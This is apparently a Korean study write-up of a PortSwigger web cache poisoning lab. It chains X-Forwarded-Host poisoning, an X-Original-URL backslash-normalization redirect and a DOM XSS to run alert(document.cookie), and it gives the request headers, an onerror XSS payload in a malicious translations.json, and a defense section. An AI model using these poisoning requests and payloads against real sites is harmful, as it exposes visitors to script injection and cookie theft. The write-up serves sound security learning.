# Lab: Combining web cache poisoning vulnerabilities

## 개요

- **난이도**: Expert
- **주제**: Web Cache Poisoning — 다중 캐시 동시 오염 / `X-Forwarded-Host` + `X-Original-URL` + 백슬래시 정규화 / DOM XSS 연계
- **링크**: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities

## 목표

여러 캐시를 **동시에** 오염시키고 피해자 언어(영어)를 강제로 바꿔, 방문자 브라우저에서 `alert(document.cookie)` 를 실행시킨다.

## 취약점 체인

```
[1] X-Forwarded-Host (unkeyed)
    → translations.json 을 공격자 서버에서 임포트하도록 조작
    → initTranslations() 의 DOM XSS (영어 이외 언어에서만 동작)

[2] 피해자는 언어가 영어(English)
    → 영어는 XSS 경로가 아님 → 언어를 강제로 바꿔야 함

[3] 언어 변경 흐름
    → /setlang/es 로 리다이렉트, lang=es 쿠키 설정
    → 홈이 /?localized=1 로 재로드

[4] X-Original-URL 로 /setlang/es 경로 지정
    → 하지만 Set-Cookie 포함 응답이라 캐시 불가

[5] 백슬래시 정규화 우회
    → X-Original-URL: /setlang\es → 서버가 302로 /setlang/es 로 정규화
    → 이 302 응답은 캐시 가능 → 모든 사용자를 스페인어 페이지로 강제

[6] 두 캐시를 동시에 오염
    → /?localized=1 (악성 JSON) + / (스페인어로 리다이렉트)
```

## 취약 지점 상세

### 1. `X-Forwarded-Host` → 번역 JSON 임포트 조작

```
응답이 translations.json 을 다음에서 임포트:
  https://<X-Forwarded-Host 값>/resources/json/translations.json
```

`initTranslations()` 는 일부 언어(영어 제외)의 번역 값을 DOM 에 안전하지 않게 삽입 → DOM XSS.

### 2. 언어 강제 변경 필요

```
피해자 lang=en → 취약한 DOM 경로를 타지 않음
→ 공격자는 피해자의 언어를 es 등으로 바꿔야 함
```

### 3. `X-Original-URL` — 상세

```
[X-Original-URL 이란]
  리버스 프록시/프레임워크가 URL 을 재정의할 때 사용하는 헤더
  요청 라인의 경로 대신 이 헤더의 경로로 라우팅

[문제]
  프론트엔드(캐시/프록시)와 백엔드가 서로 다른 값을 URL 로 해석
  → 접근 제어 우회(13-access-control/010)와 캐시 조작에 모두 악용

[이 랩에서]
  X-Original-URL: /setlang/es
  → 요청 라인은 / 인데 백엔드는 /setlang/es 로 처리
  → 언어 설정 동작을 유발
  BUT 응답에 Set-Cookie 가 있어 캐시에는 저장되지 않음
```

핵심: **`X-Original-URL` 로 라우팅을 바꿀 수 있지만, 그 응답이 캐시 가능해야** 오염이 성립한다.

### 4. 백슬래시 정규화 — 상세

```
[백슬래시(\) 특성]
  Windows 경로 구분자이자, 일부 웹서버/프록시가 슬래시(/)로 정규화
  브라우저/서버에 따라 \ 와 / 를 동등 취급하거나 리다이렉트

[동작]
  X-Original-URL: /setlang\es
  → 서버가 \ 를 / 로 정규화하며 302 Location: /setlang/es

[왜 중요한가]
  - 이 302 응답에는 Set-Cookie 가 없어 컨테이너가 조건을 통과 → 캐시 가능
  - 즉 정규화 리다이렉트를 이용하면 "캐시 가능한 언어 강제" 가 가능해짐
```

```
[정규화 계층 정리]
  캐시/프록시:  \ → / (또는 인코딩 디코딩, dot-segment 해소)
  백엔드:       경로 라우팅
  두 규칙 차이 → 캐시 키 충돌/리다이렉트 유발 (009 URL 정규화와 동일 뿌리)
```

## 공격 단계

### 1단계 — 헤더 지원 확인

Param Miner 로 `X-Forwarded-Host`, `X-Original-URL` 지원을 확인한다.

### 2단계 — 취약 JSON 구조 파악

홈이 `translations.json` 을 임포트하고, `initTranslations()` 가
영어 이외 언어에서 DOM XSS 를 유발함을 확인한다.

### 3단계 — 익스플로잇 서버 준비

```
파일 경로/이름: /resources/json/translations.json
헤더:          Access-Control-Allow-Origin: *
본문(예):      { "en": {...}, "es": { ... "View details": "</a><img src=1 onerror='alert(document.cookie)' />" ... } }
```

### 4단계 — 스페인어 페이지 캐시 오염

`lang=es` 쿠키가 있는 `/?localized=1` 요청에 cache-buster 와 `X-Forwarded-Host` 를 넣어 오염시킨다.

```
GET /?localized=1&cb=... 
Cookie: lang=es
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

익스플로잇 서버가 반영되고 `X-Cache: hit` 확인 → 브라우저로 열어 `alert()` 확인.

### 5단계 — 영어 사용자를 스페인어로 강제

영어 사용자는 공격 대상이 아니므로 언어를 바꿔야 한다.

```
GET /?cb=...
X-Original-URL: /setlang\es
```

- `\` → `/` 정규화로 302 `Location: /setlang/es`
- 이 302 는 Set-Cookie 가 없어 캐시 가능 → 모든 방문자를 스페인어 페이지로 유도

### 6단계 — 두 캐시 동시 오염

```
1) /?localized=1  ← X-Forwarded-Host 로 악성 translations.json
2) /              ← X-Original-URL: /setlang\es 로 스페인어 강제(302)
```

두 요청을 순서대로 재전송해 두 캐시를 모두 오염 상태로 유지한다.

### 7단계 — 피해자 유도

영어 페이지를 열면 → 302 로 스페인어 페이지 → 악성 JSON 로드 → `alert()` 발생.
랩이 풀릴 때까지 두 요청을 반복해 캐시를 계속 오염시킨다.

## 두 헤더 비교

| 헤더 | 역할 | 캐시 관점 |
|------|------|-----------|
| `X-Forwarded-Host` | 리소스 임포트 호스트(JSON) 조작 | unkeyed, 응답 반영 → 오염 |
| `X-Original-URL` | 서버측 요청 경로 재정의 | 응답이 캐시 가능해야 오염 성립 |

```
공통점: "프론트(캐시)가 보는 URL/호스트" 와 "백엔드가 처리하는 URL/호스트" 의 불일치를 악용
```

## 방어

```
[근본 원인]
  1) X-Forwarded-Host/X-Original-URL 등 클라이언트 헤더를 응답/라우팅에 사용
  2) 번역 JSON 등 외부 데이터를 DOM 에 안전하지 않게 삽입 (DOM XSS)
  3) 백슬래시/경로 정규화가 계층마다 달라 캐시 가능한 리다이렉트가 생성됨
  4) 캐시와 백엔드의 URL/파싱 해석 불일치

[올바른 방어]
  1. 클라이언트 헤더 불신
     - 리소스 호스트/URL/라우팅을 정식 설정값으로 결정
     - 프록시 경계에서 X-Forwarded-*, X-Original-* 제거/정규화
  2. DOM XSS 방지
     - JSON/외부 데이터를 textContent 등 안전한 API 로 삽입
     - 모든 언어에 동일한 안전 처리 (특정 언어만 취약하지 않게)
  3. URL 정규화 일관성
     - 캐시/프록시/백엔드가 동일한 정규화 규칙(백슬래시, 인코딩, dot-segment) 사용
     - 정규화 리다이렉트의 캐시 여부를 정책적으로 통제
  4. CORS 최소 허용 (ACAO:* 남용 금지)
  5. 캐시 키/캐시 가능 조건(Set-Cookie 등) 정비
  6. CSP 로 스크립트 실행 완화

[주의]
  단일 방어로는 부족하다. 헤더·출력·정규화·CORS·캐시 정책을 함께 정비해야
  이런 복합 체인을 막을 수 있다.
```

## 핵심 정리

- `X-Forwarded-Host` 로 악성 `translations.json` 을 임포트시켜 `initTranslations()` DOM XSS 를 유발했다.
- 피해자가 영어라 취약 경로를 타지 않으므로, `X-Original-URL: /setlang\es` 의 백슬래시 정규화 리다이렉트(302, 캐시 가능)로 언어를 강제했다.
- `/?localized=1`(악성 JSON) 캐시와 `/`(언어 강제) 캐시를 **동시에** 오염시켜 `alert(document.cookie)` 를 실행했다.
- 방어는 헤더 불신, DOM XSS 방지, 정규화 일관성, CORS/캐시 정책 정비다.

## 배운 점

- 001~010 의 기법(X-Forwarded-Host, X-Original-URL, 백슬래시 정규화, DOM XSS, CORS)을 **하나의 체인**으로 결합한 종합 문제다.
- `X-Original-URL` 은 라우팅만 바꾸는 것이 아니라, 응답의 캐시 가능성과 결합될 때 캐시 오염 벡터가 된다.
- 백슬래시 정규화(`\`→`/`)는 접근 제어 우회와 캐시 오염 모두에서 재사용되는 강력한 트릭이다.
- 여러 캐시를 동시에 오염시키고 피해자 행동(리다이렉트→취약 페이지 로드)을 조율하는 것이 Expert 난이도의 핵심이다.
- 근본 방어는 "캐시와 백엔드가 요청을 동일하게 해석하도록" 계층을 일관되게 만드는 것이다.
